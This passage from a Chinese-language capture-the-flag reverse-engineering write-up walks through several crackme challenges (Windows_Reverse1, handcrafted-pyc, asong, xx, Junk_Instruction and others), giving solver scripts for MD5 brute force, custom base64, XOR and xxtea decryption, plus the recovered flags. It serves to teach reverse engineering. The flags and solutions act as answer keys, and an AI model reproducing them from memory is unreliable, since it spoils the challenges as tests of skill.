[&#39;831daa3c843ba8b087c895f0ed305ce7&#39;,&#39;6722f7a07246c6af20662b855846c2c8&#39;,&#39;5f04850fec81a27ab5fc98befa4eb40c&#39;,&#39;ecf8dcac7503e63a6a3667c5fb94f610&#39;,&#39;c0fd15ae2c3931bc1e140523ae934722&#39;,&#39;569f606fd6da5d612f10cfb95c0bde6d&#39;,&#39;068cb5a1cf54c078bf0e7e89584c1a4e&#39;,&#39;c11e2cd82d1f9fbd7e4d6ee9581ff3bd&#39;,&#39;1df4c637d625313720f45706a48ff20f&#39;,&#39;3122ef3a001aaecdb8dd9d843c029e06&#39;,&#39;adb778a0f729293e7e0b19b96a4c5a61&#39;,&#39;938c747c6a051b3e163eb802a325148e&#39;,&#39;38543c5e820dd9403b57beff6020596d&#39;]for j in list1:    for a in range(len(dic)):        for b in range(len(dic)):            for c in range(len(dic)):                for d in range(len(dic)):                    for e in range(len(dic)):                        m = dic[a].encode(&#39;utf-8&#39;) + dic[b].encode(&#39;utf-8&#39;) + dic[c].encode(&#39;utf-8&#39;) + dic[d].encode(&#39;utf-8&#39;) + dic[e].encode(&#39;utf-8&#39;)                        flag = hashlib.md5()                        flag.update(m)                        md5 = flag.hexdigest()                        if md5 == j:                            print(m, end=&#39;&#39;)</code></pre><h2 id="27-Windows-Reverse1"><a href="#27-Windows-Reverse1" class="headerlink" title="27.Windows_Reverse1"></a>27.Windows_Reverse1</h2><p>这道题挺奇怪，将一串字符串作为索引表，然后我们输入的值就是表的下标，然后和一串字符串作比较。</p><p>首先先解壳，然后好像解壳后的文件就不能动调了，应该还是可以动调的，以后再学吧。</p><p><img src="https://i.loli.net/2021/01/26/aCFmg7PdbrelMch.png"><br>然后写脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[130]=&#123;0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE, 0xFF,   0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x7E, 0x7D, 0x7C, 0x7B,   0x7A, 0x79, 0x78, 0x77, 0x76, 0x75, 0x74, 0x73, 0x72, 0x71,   0x70, 0x6F, 0x6E, 0x6D, 0x6C, 0x6B, 0x6A, 0x69, 0x68, 0x67,   0x66, 0x65, 0x64, 0x63, 0x62, 0x61, 0x60, 0x5F, 0x5E, 0x5D,   0x5C, 0x5B, 0x5A, 0x59, 0x58, 0x57, 0x56, 0x55, 0x54, 0x53,   0x52, 0x51, 0x50, 0x4F, 0x4E, 0x4D, 0x4C, 0x4B, 0x4A, 0x49,   0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41, 0x40, 0x3F,   0x3E, 0x3D, 0x3C, 0x3B, 0x3A, 0x39, 0x38, 0x37, 0x36, 0x35,   0x34, 0x33, 0x32, 0x31, 0x30, 0x2F, 0x2E, 0x2D, 0x2C, 0x2B,   0x2A, 0x29, 0x28, 0x27, 0x26, 0x25, 0x24, 0x23, 0x22, 0x21,   0x20, 0x00&#125;;    char v4[17]=&quot;DDCTF&#123;reverseME&#125;&quot;;    int i,j;    printf(&quot;flag&#123;&quot;);    for(i=0;i&lt;16;i++)    &#123;        for(j=0;j&lt;=130;j++)        &#123;            if(v4[i]==a[j])            &#123;                printf(&quot;%c&quot;,j);                break;            &#125;        &#125;    &#125;    printf(&quot;&#125;&quot;);&#125;</code></pre><p>得到flag{ZZ[JX#,9(9,+9QY!}</p><h2 id="28-easyRE1"><a href="#28-easyRE1" class="headerlink" title="28.easyRE1"></a>28.easyRE1</h2><p>ida打开，f5一下就可以得到flag{db2f62a36a018bce28e46d976e3f9864}</p><h2 id="29-ReverseMe-120"><a href="#29-ReverseMe-120" class="headerlink" title="29.ReverseMe-120"></a>29.ReverseMe-120</h2><p>这道题是base解码过程，以前都做的是编码，开始还没看懂。</p><p>根据提示字符串’you_know_how_to_remove_junk_code’，来用动调找到关键位置，明白加密原理。</p><p>第一次加密。<br><img src="https://i.loli.net/2021/01/26/k3wRSoZaiXbFCdj.png"><br>第二次加密。<br><img src="https://i.loli.net/2021/01/26/knUD9PyY1ZVQRuG.png"><br>然后到ida里面看相关位置。<br><img src="https://i.loli.net/2021/01/26/horHuJXsD21BMwO.png"><br>知道是base64解码就简单多了，就异或0x25然后解码。</p><p>脚本如下</p><pre><code>import base64date_1 = &quot;you_know_how_to_remove_junk_code&quot;date_2 = &#39;&#39;for i in date_1:    date_2 += chr(ord(i)^0x25)date = date_2.encode(&quot;utf-8&quot;)flag = base64.b64encode(date)  # 被编码的参数必须是二进制数据print(flag)</code></pre><h2 id="30-android-app-100"><a href="#30-android-app-100" class="headerlink" title="30.android-app-100"></a>30.android-app-100</h2><p>安卓逆向，就当长见识吧。还要分析解压的一个so文件，确实做不来。</p><p>先jeb分析。<br><img src="https://i.loli.net/2021/01/26/bzfUeGwVhTmurON.png"><br>现在通过ida分析so文件来得到v1<br><img src="https://i.loli.net/2021/01/26/nQDwrvXkay4E9oN.png"><br>然后就可以写脚本了，如果网上直接转好像不行，那个空格转不了。</p><pre><code>import hashlibstr = &#39;92174992 &#39;# 92060626+114366+“ ”hl = hashlib.md5()hl.update(str.encode(encoding=&#39;utf-8&#39;))print(&#39;MD5加密前为 ：&#39; + str)print(&#39;MD5加密后为 ：&#39; + hl.hexdigest())</code></pre><p>套上格式得到Sharif_CTF(833489ef285e6fa80690099efc5d9c9d)</p><h2 id="31-serial-150"><a href="#31-serial-150" class="headerlink" title="31.serial-150"></a>31.serial-150</h2><p>静态分析好像不行，必须动态分析，比较麻烦的就是不知道怎么改指令，好像改不了，xdbg都可以改。ida调试如下</p><p>然后这里是输入flag，随便输就行了<br><img src="https://i.loli.net/2021/01/26/67WfpOosuhtBq2e.png"><br>判断长度<br><img src="https://i.loli.net/2021/01/26/85JcZSk17YV6ngx.png"><br>然后是第一位<br><img src="https://i.loli.net/2021/01/26/bW6YcNjgC5XDvlh.png"><br>然后是第一位和最后一位的和的一个判断<br><img src="https://i.loli.net/2021/01/26/5tcyu3kWdoY8CET.png"><br>然后就是第二位，第三位，总共要改33次zf。</p><p>得到flag：EZ9dmq4c8g9G7bAV</p><h2 id="32-testre"><a href="#32-testre" class="headerlink" title="32.testre"></a>32.testre</h2><p>就是base58，由于之前了解过，然后题中有一个让你混淆base64，实际上没得用，要解的话就直接排序一下最后的密文，然后网站直接解就行了。</p><p>得到flag：base58_is_boring</p><h2 id="33-handcrafted-pyc"><a href="#33-handcrafted-pyc" class="headerlink" title="33.handcrafted-pyc"></a>33.handcrafted-pyc</h2><p>这道题学到了很多东西，文件读写呀，和python字节码这些。</p><p>看了别人wp做的，先根据题意生成pyc</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-import marshal,zlib,base64out=zlib.decompress(base64.b64decode(&#39;eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ==&#39;))f=open(&#39;out&#39;,&#39;wb&#39;)f.write(out)f.close()</code></pre><p>注意要在python2.7下来生成out文件，然后加上pyc后缀，然后还要用编辑器加上pyc文件头03 F3 0D 0A 97 32 18 5E 63，不然无法反编译。py和pyc<a href="https://www.cnblogs.com/blili/p/11799483.html">https://www.cnblogs.com/blili/p/11799483.html</a></p><p>然后用uncompyle6 -o命令反编译，得到一个py文件，代码很长，是python的字节码。就直接上脚本了，可以去看大佬的wp，挺详细的。</p><pre><code>import rewith open(&#39;1.txt&#39;,&#39;r&#39;) as f:    line = []    for i in range(950):        line.append(f.readline())l1=[]for i in line:    if &#39;LOAD_CONST&#39; in i :        l1.append(re.findall(r&#39;\d+&#39;,i))print(l1)s=&#39;&#39;for i in l1:    if i[1]!=0:        s +=chr(int(i[1]))def ROT_TWO(l):    a =l.pop()    b =l.pop()    l.append(a)    l.append(b)    return ldef BINARY_ADD(l):    a =l.pop()    b =l.pop()    # print(&#39;&#123;&#39;+a,b,a+b,b+a+&#39;&#125;&#39;)    l.append(b+a)//注意这里必须是b+a，字符串的相加不能换换顺序。    return l# s =&quot;llaC em yP aht notriv lauhcamni !eac Ini npreterP tohty ntybdocese!!! ctihN&#123;noy woc uoc naipmoa eldnur yP nnohttyb doceni euoy rb ria&#125;!napwssro :dorWp gnssadrow...elP  esa yrtaga .ni oD tonurbf etecro)= .&quot;l3=list(s)l4=[]j=0for i in line:    if &#39;LOAD_CONST&#39; in i:        l4.append(l3[j])        # print(l4)        j +=1    elif &#39;ROT_TWO&#39; in i:        l4=ROT_TWO(l4)    elif &#39;BINARY_ADD&#39; in i:        l4=BINARY_ADD(l4)print(l4)</code></pre><p>需要注意的是我的1.txt是改了’738  LOAD_CONST    None’成为’738  LOAD_CONST    32’，也就是加了一个空格，不然脚本会出错。</p><p>得到flag：hitcon{Now you can compile and run Python bytecode in your brain!}</p><h2 id="34-asong"><a href="#34-asong" class="headerlink" title="34.asong"></a>34.asong</h2><p>这道题主要考了一个文件读写，然后根据that_girl这个文件构成一个索引表。</p><p>ida先看大致框架<br><img src="https://i.loli.net/2021/02/13/dQTMtkqHnF1gCLu.png"><br>然后再来看3个加密<br><img src="https://i.loli.net/2021/02/13/m3LzICFiEeNWfYQ.png"><br>然后写脚本</p><pre><code>with open(&#39;out&#39;,&#39;rb&#39;) as f:    line=[]    line.append(f.read())print(line)s=list(line[0])code=&#39;&#39;for i in s:    code +=hex(i)    code +=&#39;,&#39;print(code)with open(&#39;that_girl&#39;,&#39;r&#39;) as f:    str = &#39;&#39;    str = f.read()str1=list(str.lower())print(str1)L1=[&#39; &#39;,&#39;\&#39;&#39;, &#39;_&#39;, &#39;a&#39;, &#39;c&#39;, &#39;b&#39;, &#39;e&#39;, &#39;d&#39;, &#39;g&#39;, &#39;f&#39;, &#39;i&#39;, &#39;h&#39;, &#39;k&#39;, &#39;m&#39;, &#39;l&#39;, &#39;o&#39;, &#39;n&#39;, &#39;p&#39;, &#39;s&#39;, &#39;r&#39;, &#39;u&#39;, &#39;t&#39;, &#39;w&#39;, &#39;v&#39;, &#39;y&#39;]num=0for i in L1:    num = 0    for j in range(len(str1)):        if i == str1[j]:            num+=1    print(&#39;%d: \&#39;%c\&#39;,&#39; %(num,i),end=&#39;&#39;)print(&#39;\n&#39;)l1=[0xec,0x29,0xe3,0x41,0xe1,0xf7,0xaa,0x1d,0x29,0xed,0x29,0x99,0x39,0xf3,0xb7,0xa9,0xe7,0xac,0x2b,0xb7,0xab,0x40,0x9f,0xa9,0x31,0x35,0x2c,0x29,0xef,0xa8,0x3d,0x4b,0xb0,0xe9,0xe1,0x68,0x7b,0x41]l2=[]mid=l1[37]&amp;0x7for i in range(0,len(l1)):    l2.append((mid&lt;&lt;5)|(l1[i]&gt;&gt;3))    mid=l1[i]&amp;0x7print(l2)l3=[0]*38table=[22, 0, 6, 2, 30, 24, 9, 1, 21, 7, 18, 10, 8, 12, 17, 23, 13, 4, 3, 14, 19, 11, 20, 16, 15, 5, 25, 36, 27, 28, 29, 37, 31, 32, 33, 26, 34, 35]dict= &#123;71: &#39; &#39;,40: &#39;\&#39;&#39;,245: &#39;_&#39;,104: &#39;a&#39;,15: &#39;c&#39;,30: &#39;b&#39;,169: &#39;e&#39;,29: &#39;d&#39;,38: &#39;g&#39;,19: &#39;f&#39;,60: &#39;i&#39;,67: &#39;h&#39;,20: &#39;k&#39;,28: &#39;m&#39;,39: &#39;l&#39;,165: &#39;o&#39;,118: &#39;n&#39;,26: &#39;p&#39;,51: &#39;s&#39;,61: &#39;r&#39;,45: &#39;u&#39;,133: &#39;t&#39;,34: &#39;w&#39;,7: &#39;v&#39;,62: &#39;y&#39;&#125;j=0while(table[j]):    l3[table[j]]=l2[j]    j=table[j]l3[0]=133print(l3)flag=&#39;&#39;for i in l3:    flag+=dict[i]print(&#39;QCTF&#123;&#39;+flag+&#39;&#125;&#39;)</code></pre><p>得到QCTF{that_girl_saying_no_for_your_vindicate}</p><h2 id="35-梅津美治郎"><a href="#35-梅津美治郎" class="headerlink" title="35.梅津美治郎"></a>35.梅津美治郎</h2><p>先ida静态分析一下<br><img src="https://i.loli.net/2021/02/13/zB85I2cSxqPNDsA.png"><br>然后动调一下,有一个int3异常，然后调用了自己的一个异常处理函数<br><img src="https://i.loli.net/2021/02/13/zleMiaqPkCB9x61.png"><br>再进入第二个比较函数内部<br><img src="https://i.loli.net/2021/02/13/T8RAIxW3zYKaOSG.png"><br>开始写脚本</p><pre><code>a=&#39;u1nnf2lg&#39;c=&#39;&#39;for i in a:    c+=chr(ord(i) ^ 2)print(&#39;flag&#123;r0b0RUlez!_&#39;+c+&#39;&#125;&#39;)</code></pre><p>得到flag{r0b0RUlez!_w3lld0ne}</p><h2 id="36-echo-server"><a href="#36-echo-server" class="headerlink" title="36.echo-server"></a>36.echo-server</h2><p>这道题就是对去花指令的考察吧<br><img src="https://i.loli.net/2021/02/13/O129d7vsTMhiI45.png"><br>可能有点省略，多试试就行了<br><img src="https://i.loli.net/2021/02/13/wfHAPxUmYXZSNDh.png"><br>然后就可以看到代码了<br><img src="https://i.loli.net/2021/02/13/6ZzUwR1DikEuBpF.png"><br>然后不知道为什么我保存的文件，然后放到虚拟机，运行不了。就贴一个flag吧：F8C60EB40F66919A77C4BD88D45DEF4</p><h2 id="37-re5-packed-movement"><a href="#37-re5-packed-movement" class="headerlink" title="37.re5-packed-movement"></a>37.re5-packed-movement</h2><p>这道题有upx加壳，然后脱壳后不能反编译，但是如果细心的话可以发现一些特点</p><pre><code>mov     R2, 41h ; &#39;A&#39;</code></pre><p>这种指令每格一段距离就会出现，先全部搜索一下，直接alt+t<br><img src="https://i.loli.net/2021/02/13/CFVpcX19JDtl4da.png"><br>flag就出来了<br><img src="https://i.loli.net/2021/02/13/bDsao63YnWOcLJI.png"><br>得到ALEXCTF{M0Vfusc4t0r_w0rk5_l1ke_m4g1c}</p><h2 id="38-What-does-this-button-do"><a href="#38-What-does-this-button-do" class="headerlink" title="38.What-does-this-button-do"></a>38.What-does-this-button-do</h2><p>ida打开时发现了这个，直接改后缀为.apk<br><img src="https://i.loli.net/2021/02/13/foa6FrwMvGJUu1p.png"><br>然后jeb打开，找到关键代码<br><img src="https://i.loli.net/2021/02/13/EVSasbg7AdmGphX.png"><br>写脚本</p><pre><code>list=[102, 108, 97, 103, 0x7B, 0x77, 52, 110, 110, 52, 0x5F, 106, 52, 0x72, 0x5F, 109, 0x79, 0x5F, 100, 51, 120, 0x7D]flag=&#39;&#39;for i in list:    flag +=chr(i)print(flag)</code></pre><p>得到flag{w4nn4_j4r_my_d3x}</p><h2 id="39-easyGo"><a href="#39-easyGo" class="headerlink" title="39.easyGo"></a>39.easyGo</h2><p>之前一直想用去符号表的脚本，一直没成功，今天到处找了一些资料，看了看师傅们的博客终于弄好了，简单说一下过程。</p><ol><li><a href="https://github.com/sibears/IDAGolangHelper.git">https://github.com/sibears/IDAGolangHelper.git</a>下载脚本</li><li>ida7.0，7.5都用不起，<a href="https://blog.csdn.net/qq_21063873/article/details/104335240">https://blog.csdn.net/qq_21063873/article/details/104335240</a>改脚本后7.0就可用了。</li><li>File–Script file—脚本，就可以发现函数名改了。</li></ol><p>然后分析题目<br><img src="https://i.loli.net/2021/03/25/3tqr9UZh81BXSEj.png"><br>脚本</p><pre><code>import base64import stringstr1 = &#39;tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3&#39;string1 = &quot;6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print(base64.b64decode(str1.translate(str.maketrans(string1, string2))))</code></pre><p>得到flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}</p><h2 id="40-2ex"><a href="#40-2ex" class="headerlink" title="40.2ex"></a>40.2ex</h2><p>mips架构，不得不说反编译后还是很难看。一个变表的base64。<br><img src="https://i.loli.net/2021/03/31/IOFm1jWDcJBRHd4.png"><br>脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[64]=&#123;  0x40, 0x2C, 0x2E, 0x31, 0x66, 0x67, 0x76, 0x77, 0x23, 0x60,   0x2F, 0x32, 0x65, 0x68, 0x75, 0x78, 0x24, 0x7E, 0x22, 0x33,   0x64, 0x69, 0x74, 0x79, 0x25, 0x5F, 0x3B, 0x34, 0x63, 0x6A,   0x73, 0x7A, 0x5E, 0x2B, 0x7B, 0x35, 0x62, 0x6B, 0x72, 0x41,   0x26, 0x3D, 0x7D, 0x36, 0x61, 0x6C, 0x71, 0x42, 0x2A, 0x2D,   0x5B, 0x37, 0x30, 0x6D, 0x70, 0x43, 0x28, 0x29, 0x5D, 0x38,   0x39, 0x6E, 0x6F, 0x44&#125;;  int i;  for(i=0;i&lt;64;i++)  &#123;      printf(&quot;%c&quot;,a[i]);  &#125;&#125;//@,.1fgvw#`/2ehux$~&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD</code></pre><p>base64解密<br>    import base64</p><pre><code>base1 = &#39;@,.1fgvw#`/2ehux$~&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD&#39;t = &#39;_r-+_Cl5;vgq_pdme7#7eC0=&#39;//把第一个删了。base = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;ans = &#39;&#39;for i in t:    ans += base[base1.index(i)]print(ans)print(base64.b64decode(ans))</code></pre><p>得到flag{change53233}</p><h2 id="first"><a href="#first" class="headerlink" title="first"></a>first</h2><p>一道多线程md5加密，然后检验的方式也挺独特。通过动调更能理解一些变量的含义，和整个逻辑过程。可以用ida脚本findcrypt</p><p>分析整个过程<br><img src="https://i.loli.net/2021/03/31/HCTAsGIumR5ipvr.png"><br>然后是创建了线程来进行md5加密，线程调用了6次，每次加密4个字符。<br><img src="https://i.loli.net/2021/03/31/kDm1wUsj32g49fl.png"><br>最后是输出真正的flag<br><img src="https://i.loli.net/2021/03/31/HSF5m17izOBVch9.png"></p><p>解题思路就是先md5爆破得到输入的24个字符，然后异或得到flag</p><p>md5爆破脚本，好像md5爆破，密文必须是小写字母样，大写爆不出来。</p><pre><code>import hashliblist1=[&#39;4746bbbd02bb590f&#39;,&#39;BEAC2821ECE8FC5C&#39;,&#39;ad749265ca7503ef&#39;,&#39;4386B38FC12C4227&#39;,&#39;B03ECC45A7EC2DA7&#39;, &#39;BE3C5FFE121734E8&#39;]for j in list1:    for a in range(48,128):        for b in range(48,128):            for c in range(48,128):                for d in range(48,128):                    str = chr(a)+chr(b)+chr(c)+chr(d)                    flag = hashlib.md5(str.encode(&#39;utf-8&#39;)).hexdigest()                    if flag[0:16] == j.casefold():                        print(str, end=&#39;&#39;)//juhuhfenlapsiuerhjifdunu</code></pre><p>然后异或解密，然后会发现一些数据不对(goodjobyougeytcnsflaj284)，原因是爆破出来md5的字符是乱的，根据错误位置判断是第4组和第6组有问题，略微调一下顺序，并且还有一个点，就是v11的值还是要是原来的值，写出的脚本如下。</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(void)&#123;    char str[25]=&quot;juhuhfenlapsiuerhjifdunu&quot;;    char flag[25];    int table[25]=&#123;0xFE, 0xE9, 0xF4, 0xE2, 0xF1, 0xFA, 0xF4, 0xE4, 0xF0,   0xE7, 0xE4, 0xE5, 0xE3, 0xF2, 0xF5, 0xEF, 0xE8, 0xFF, 0xF6,   0xF4, 0xFD, 0xB4, 0xA5, 0xB2&#125;;    int i,mid,num=0;    for(i=0;i&lt;24;i++)    &#123;        mid=str[i]+i;        num^=mid;    &#125;    strcpy(str,&quot;juhuhfenlapsdunuhjifiuer&quot;);    for(i=0;i&lt;24;i++)    &#123;        flag[i]=num ^ table[i] ^ str[i];        printf(&quot;%c&quot;,flag[i]);    &#125;&#125;</code></pre><h2 id="MyDriver2-397"><a href="#MyDriver2-397" class="headerlink" title="MyDriver2-397"></a>MyDriver2-397</h2><p>驱动逆向</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int main()&#123;    unsigned int a[32]=&#123; 0x5C6E1395, 0x5C5813A2, 0x5C5413B3, 0x5C541388, 0x5C57139A, 0x5C5013A9, 0x5C6E13A2, 0x5C0213F7, 0x5C1F13F6, 0x5C4913B1, 0x000013B1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0&#125;;    int i,j;    char m[128]=&#123;0x50,0x00,0x5F,0x00,0x67,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x4D,0x00,0x65,0x00,0x5F,0x00,0x66,0x00,0x6C,0x00,0x61,0x00,0x67,0x00,0x5F,0x00,0x32,0x00,0x33,0x00,0x33,0x00,0x2E,0x00,0x74,0x00,0x78,0x00,0x74,0x00,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C,0xC5,0x13,0x31,0x5C&#125;;        char n[128]=&#123; 0x70, 0x74, 0x37, 0x65, 0x47, 0x66, 0x05, 0x61, 0x11, 0x20,   0x0C, 0x73, 0x6D, 0x41, 0x3A, 0x73, 0x36, 0x6D, 0x16, 0x6C,   0x09, 0x5F, 0x28, 0x6E, 0x0B, 0x69, 0x31, 0x65, 0x6D, 0x68,   0x5C, 0x6F, 0x58, 0x5F, 0x6A, 0x72, 0x02, 0x00, 0x78, 0x00,   0x74, 0x00, 0x50, 0x00, 0x5F, 0x00, 0x67, 0x00, 0x69, 0x00,   0x76, 0x00, 0x65, 0x00, 0x4D, 0x00, 0x65, 0x00, 0x5F, 0x00,   0x66, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x67, 0x00, 0x5F, 0x00,   0x32, 0x00, 0x33, 0x00, 0x33, 0x00, 0x2E, 0x00, 0x74, 0x00,   0x78, 0x00, 0x74, 0x00, 0x50, 0x00, 0x5F, 0x00, 0x67, 0x00,   0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x4D, 0x00, 0x65, 0x00,   0x5F, 0x00, 0x66, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x67, 0x00,   0x5F, 0x00, 0x32, 0x00, 0x33, 0x00, 0x33, 0x00, 0x2E, 0x00,   0x74, 0x00, 0x78, 0x00, 0x74, 0x00, 0x50, 0x00&#125;;    for(i=0;i&lt;32;i++)//得到m     &#123;        a[i]=(a[i]^1546720197);        printf(&quot;0x%02X,0x%02X,0x%02X,0x%02X,&quot;, *((char*)&amp;a[i])&amp;0xff,*((char*)&amp;a[i] + 1)&amp;0xff,*((char*)&amp;a[i] +2)&amp;0xff,*((char*)&amp;a[i]+3)&amp;0xff);    &#125;    for(int i=0;i&lt;128;i++)    &#123;        n[i]^=m[i%42];    &#125;    printf(&quot;%s&quot;,n);  &#125; </code></pre><h2 id="xx"><a href="#xx" class="headerlink" title="xx"></a>xx</h2><p>大致流程</p><p>输入flag，对前4位进行检验<br><img src="https://i.loli.net/2021/04/11/8tGLzxPCs6lXN2w.png"><br>填充key，然后xxtea加密<br><img src="https://i.loli.net/2021/04/11/1RiSKQdqe7X8olw.png"><br>然后换位，异或加密<br><img src="https://i.loli.net/2021/04/11/zuhPHn1ptKm6xUi.png"><br>最后比较<br><img src="https://i.loli.net/2021/04/11/TX5Udgwp1AyG6Ob.png"><br>所以解题思路就是，先异或解密，换位，再xxtea解密</p><p>exp</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int code[24]=&#123;0xCE, 0xBC, 0x40, 0x6B, 0x7C, 0x3A, 0x95, 0xC0, 0xEF, 0x9B,   0x20, 0x20, 0x91, 0xF7, 0x02, 0x35, 0x23, 0x18, 0x02, 0xC8,   0xE7, 0x56, 0x56, 0xFA&#125;;      int i,j,a;      for(i=23;i&gt;0;i--)      &#123;          a=i/3-1;          if(i/3&gt;0)          &#123;              do            &#123;                code[i]^=code[a--];            &#125;            while(a&gt;=0);                &#125;    &#125;    for(i=0;i&lt;24;i++)    &#123;        printf(&quot;%X &quot;,code[i]);    &#125;    printf(&quot;\n0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X,0x%X&quot;,code[1],code[3],code[0],code[2],code[5],code[7],code[4],code[6],code[9],code[11],code[8],code[10],code[13],code[15],code[12],code[14],code[17],code[19],code[16],code[18],code[21],code[23],code[20],code[22]); &#125; //0xBC,0xA5,0xCE,0x40,0xF4,0xB2,0xB2,0xE7,0xA9,0x12,0x9D,0x12,0xAE,0x10,0xC8,0x5B,0x3D,0xD7,0x6,0x1D,0xDC,0x70,0xF8,0xDC</code></pre><p>xxtea解密</p><pre><code>#include&lt;stdio.h&gt;void decrypt(unsigned int *code ,unsigned int *key ,unsigned int n)&#123;    unsigned int next,end,sum;    unsigned int rounds,e,delta=0x9e3779b9;    int i;    rounds=6+52/n;    sum=rounds*delta&amp; 0xffffffff;        next=code[0];//设置next为code的第一个     do    &#123;        e=(sum&gt;&gt;2)&amp;3;        for(i=n-1;i&gt;0;i--)//解密最后一个到第二个        &#123;            end=code[i-1];            code[i]-=(( (end&gt;&gt;5^next&lt;&lt;2)  + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) + (key[(i&amp;3)^e]^end) ))&amp; 0xffffffff;            next=code[i];        &#125;        end=code[n-1];        code[0]-=(( (end&gt;&gt;5^next&lt;&lt;2) + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) +(key[i&amp;3^e]^end) ))&amp; 0xffffffff;        next=code[0];        sum=(sum-delta)&amp; 0xffffffff;    &#125;while(--rounds);&#125;int main()&#123;    unsigned key[4]=&#123;0x67616c66,0,0,0&#125;;    unsigned int n=6;    int i;    unsigned int code[6]=&#123;0x40cea5bc,0xe7b2b2f4,0x129d12a9,0x5bc810ae,0x1d06d73d,0xdcf870dc&#125;;    decrypt(code,key,n);    for(i=0;i&lt;5;i++)    &#123;    //    printf(&quot;%x&quot;,code[i]);        printf(&quot;%c%c%c%c&quot;, *((char*)&amp;code[i])&amp;0xff,*((char*)&amp;code[i] + 1)&amp;0xff,*((char*)&amp;code[i] + 2)&amp;0xff,*((char*)&amp;code[i]+3)&amp;0xff);    &#125;&#125;//flag&#123;CXX_and_++tea&#125;</code></pre><h2 id="Junk-Instruction"><a href="#Junk-Instruction" class="headerlink" title="Junk_Instruction"></a>Junk_Instruction</h2><p>这道题的关键点就是MFC的check跳到了哪里，和去花指令(感觉有点难)，或者动调找关键点和对比部分。然后就是带不同的数据去试。</p><p>先用xspy软件得到check后跳到了哪里，如下。<br><img src="https://i.loli.net/2021/04/22/hYuBHw1z3lmjMKx.png"><br><img src="https://i.loli.net/2021/04/22/ZxVOpvNqLtU4ikS.png"><br>加密过程就是，flag去掉前5个和最后一个，然后倒序，然后rc4加密。</p><p>具体过程就是动调了，主要看xor和cmp，然后cmp数据的时候，是从最后一个开始比较的，也没什么关系。</p><p>exp，注意密文里面有个0，会导致脚本的len出问题，所以直接将len=32</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned longULONG;/*初始化函数*/void 